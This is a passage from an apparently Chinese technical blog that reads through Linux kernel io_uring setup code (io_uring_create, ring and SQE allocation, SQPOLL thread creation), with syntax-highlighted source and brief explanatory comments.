class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_create</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (entries &gt; IORING_MAX_ENTRIES) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">entries = IORING_MAX_ENTRIES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>设置sq_entries 以2的幂次向上取整， 这是为了方便环形队列的处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_entries = roundup_pow_of_two(entries);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQSIZE) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If IORING_SETUP_CQSIZE is set, we do the same roundup</span></span><br><span class="line"><span class="comment"> * to a power-of-two, if it isn&#x27;t already. We do NOT impose</span></span><br><span class="line"><span class="comment"> * any cq vs sq ring sizing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!p-&gt;cq_entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_entries &gt; IORING_MAX_CQ_ENTRIES) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">p-&gt;cq_entries = IORING_MAX_CQ_ENTRIES;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;cq_entries = roundup_pow_of_two(p-&gt;cq_entries);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_entries &lt; p-&gt;sq_entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p-&gt;cq_entries = <span class="number">2</span> * p-&gt;sq_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一系列设置ctx的代码，笔者暂且不在这里分析，之后遇见了再分析每一项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ctx = io_ring_ctx_alloc(p);</span><br><span class="line"><span class="keyword">if</span> (!ctx)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">ctx-&gt;task_complete = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;task_complete || (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line">ctx-&gt;lockless_cq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * lazy poll_wq activation relies on -&gt;task_complete for synchronisation</span></span><br><span class="line"><span class="comment"> * purposes, see io_activate_pollwq()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;task_complete)</span><br><span class="line">ctx-&gt;poll_activated = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When SETUP_IOPOLL and SETUP_SQPOLL are both enabled, user</span></span><br><span class="line"><span class="comment"> * space applications don&#x27;t need to do io completion events</span></span><br><span class="line"><span class="comment"> * polling again, they can rely on io_sq_thread to do polling</span></span><br><span class="line"><span class="comment"> * work, which can reduce cpu usage and uring_lock contention.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">ctx-&gt;syscall_iopoll = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">ctx-&gt;compat = in_compat_syscall();</span><br><span class="line"><span class="keyword">if</span> (!ns_capable_noaudit(&amp;init_user_ns, CAP_IPC_LOCK))</span><br><span class="line">ctx-&gt;user = get_uid(current_user());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQPOLL, we just need a wakeup, always. For !SQPOLL, if</span></span><br><span class="line"><span class="comment"> * COOP_TASKRUN is set, then IPIs are never needed by the app.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line"><span class="comment">/* IPI related flags don&#x27;t make sense with SQPOLL */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; (IORING_SETUP_COOP_TASKRUN |</span><br><span class="line">  IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">  IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_COOP_TASKRUN) &#123;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_TASKRUN_FLAG &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For DEFER_TASKRUN we require the completion task to be the same as the</span></span><br><span class="line"><span class="comment"> * submission task. This implies that there is only one submitter, so enforce</span></span><br><span class="line"><span class="comment"> * that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER)) &#123;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is just grabbed for accounting purposes. When a process exits,</span></span><br><span class="line"><span class="comment"> * the mm is exited and dropped before the files, hence we need to hang</span></span><br><span class="line"><span class="comment"> * on to this mm purely for the purposes of being able to unaccount</span></span><br><span class="line"><span class="comment"> * memory (locked/pinned vm). It&#x27;s not used for anything else.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mmgrab(current-&gt;mm);</span><br><span class="line">ctx-&gt;mm_account = current-&gt;mm;</span><br></pre></td></tr></table></figure><p>[[#<code>io_allocate_scq_urings</code> ]]  分配了scq和rings的内存</p><p>[[#<code>io_sq_offload_create</code>]]      创建了任务处理线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ret = io_allocate_scq_urings(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_sq_offload_create(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_rsrc_init(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br></pre></td></tr></table></figure><p>设置sq_off，即通过 <code>params</code> 返回给用户的 <code>ring</code> 中各个成员的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_off.head = offsetof(<span class="keyword">struct</span> io_rings, sq.head);</span><br><span class="line">p-&gt;sq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, sq.tail);</span><br><span class="line">p-&gt;sq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_mask);</span><br><span class="line">p-&gt;sq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_entries);</span><br><span class="line">p-&gt;sq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, sq_flags);</span><br><span class="line">p-&gt;sq_off.dropped = offsetof(<span class="keyword">struct</span> io_rings, sq_dropped);</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">p-&gt;sq_off.<span class="built_in">array</span> = (<span class="type">char</span> *)ctx-&gt;sq_array - (<span class="type">char</span> *)ctx-&gt;rings;</span><br><span class="line">p-&gt;sq_off.resv1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">p-&gt;sq_off.user_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;cq_off.head = offsetof(<span class="keyword">struct</span> io_rings, cq.head);</span><br><span class="line">p-&gt;cq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, cq.tail);</span><br><span class="line">p-&gt;cq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_mask);</span><br><span class="line">p-&gt;cq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_entries);</span><br><span class="line">p-&gt;cq_off.overflow = offsetof(<span class="keyword">struct</span> io_rings, cq_overflow);</span><br><span class="line">p-&gt;cq_off.cqes = offsetof(<span class="keyword">struct</span> io_rings, cqes);</span><br><span class="line">p-&gt;cq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, cq_flags);</span><br><span class="line">p-&gt;cq_off.resv1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>设置feature</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;features = IORING_FEAT_SINGLE_MMAP | IORING_FEAT_NODROP |</span><br><span class="line">IORING_FEAT_SUBMIT_STABLE | IORING_FEAT_RW_CUR_POS |</span><br><span class="line">IORING_FEAT_CUR_PERSONALITY | IORING_FEAT_FAST_POLL |</span><br><span class="line">IORING_FEAT_POLL_32BITS | IORING_FEAT_SQPOLL_NONFIXED |</span><br><span class="line">IORING_FEAT_EXT_ARG | IORING_FEAT_NATIVE_WORKERS |</span><br><span class="line">IORING_FEAT_RSRC_TAGS | IORING_FEAT_CQE_SKIP |</span><br><span class="line">IORING_FEAT_LINKED_FILE | IORING_FEAT_REG_REG_RING;</span><br></pre></td></tr></table></figure><p>再将<code>params</code>复制回用户空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(params, p, <span class="keyword">sizeof</span>(*p))) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是注册fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER</span><br><span class="line">    &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">WRITE_ONCE(ctx-&gt;submitter_task, get_task_struct(current));</span><br><span class="line"></span><br><span class="line">file = io_uring_get_file(ctx);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">ret = PTR_ERR(file);</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __io_uring_add_tctx_node(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err_fput;</span><br><span class="line">tctx = current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install ring fd as the very last thing, so we don&#x27;t risk someone</span></span><br><span class="line"><span class="comment"> * having closed it before we finish setup</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">ret = io_ring_add_registered_file(tctx, file, <span class="number">0</span>, IO_RINGFD_REG_MAX);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = io_uring_install_fd(file);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fput;</span><br></pre></td></tr></table></figure><p>错误处理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">err:</span><br><span class="line">io_ring_ctx_wait_and_kill(ctx);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">err_fput:</span><br><span class="line">fput(file);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><h4 id="io-allocate-scq-urings"><code>io_allocate_scq_urings</code></h4><p>首先是rings的分配，核心关键点在于NO_MMAP 的处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_allocate_scq_urings</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span>;</span></span><br><span class="line"><span class="type">size_t</span> size, sq_array_offset;</span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure these are sane, as we already accounted them */</span></span><br><span class="line">ctx-&gt;sq_entries = p-&gt;sq_entries;</span><br><span class="line">ctx-&gt;cq_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line">size = rings_size(ctx, p-&gt;sq_entries, p-&gt;cq_entries, &amp;sq_array_offset);</span><br><span class="line"><span class="keyword">if</span> (size == SIZE_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">rings = io_mem_alloc(size);</span><br><span class="line"><span class="comment">// 如果没有设置NO_MMAP，就分配</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">rings = io_rings_map(ctx, p-&gt;cq_off.user_addr, size);</span><br><span class="line"><span class="comment">// 反之，建立映射</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rings))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rings);</span><br><span class="line"></span><br><span class="line">ctx-&gt;rings = rings;</span><br></pre></td></tr></table></figure><p>接下来是类似的，sqe的分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">ctx-&gt;sq_array = (u32 *)((<span class="type">char</span> *)rings + sq_array_offset);</span><br><span class="line">rings-&gt;sq_ring_mask = p-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;cq_ring_mask = p-&gt;cq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;sq_ring_entries = p-&gt;sq_entries;</span><br><span class="line">rings-&gt;cq_ring_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">size = array_size(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">size = array_size(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">if</span> (size == SIZE_MAX) &#123;</span><br><span class="line">io_rings_free(ctx);</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">ptr = io_mem_alloc(size);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ptr = io_sqes_map(ctx, p-&gt;sq_off.user_addr, size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr)) &#123;</span><br><span class="line">io_rings_free(ctx);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;sq_sqes = ptr;</span><br></pre></td></tr></table></figure><h3 id="io-sq-offload-create"><code>io_sq_offload_create</code></h3><p>如果设置了 SQPOLL， 用来创建内核收割任务的线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_sq_offload_create</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Retain compatibility with failing for an invalid attach attempt */</span></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; (IORING_SETUP_ATTACH_WQ | IORING_SETUP_SQPOLL)) ==</span><br><span class="line">IORING_SETUP_ATTACH_WQ) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">f = fdget(p-&gt;wq_fd);</span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -ENXIO;</span><br><span class="line"><span class="keyword">if</span> (!io_is_uring_fops(f.file)) &#123;</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">fdput(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span>;</span></span><br><span class="line"><span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">ret = security_uring_sqpoll();</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">sqd = io_get_sq_data(p, &amp;attached);</span><br><span class="line"><span class="comment">// 获取一个sqd </span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sqd)) &#123;</span><br><span class="line">ret = PTR_ERR(sqd);</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;sq_creds = get_current_cred();</span><br><span class="line">ctx-&gt;sq_data = sqd;</span><br><span class="line">ctx-&gt;sq_thread_idle = msecs_to_jiffies(p-&gt;sq_thread_idle);</span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;sq_thread_idle)</span><br><span class="line">ctx-&gt;sq_thread_idle = HZ;</span><br><span class="line"><span class="comment">// 设置相关信息</span></span><br><span class="line">io_sq_thread_park(sqd);</span><br><span class="line">list_add(&amp;ctx-&gt;sqd_list, &amp;sqd-&gt;ctx_list);</span><br><span class="line">io_sqd_update_thread_idle(sqd);</span><br><span class="line"><span class="comment">/* don&#x27;t attach to a dying SQPOLL thread, would be racy */</span></span><br><span class="line">ret = (attached &amp;&amp; !sqd-&gt;thread) ? -ENXIO : <span class="number">0</span>;</span><br><span class="line">io_sq_thread_unpark(sqd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"><span class="keyword">if</span> (attached)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line"><span class="type">int</span> cpu = p-&gt;sq_thread_cpu;</span><br><span class="line"></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (cpu &gt;= nr_cpu_ids || !cpu_online(cpu))</span><br><span class="line"><span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">sqd-&gt;sq_cpu = cpu;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sqd-&gt;sq_cpu = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 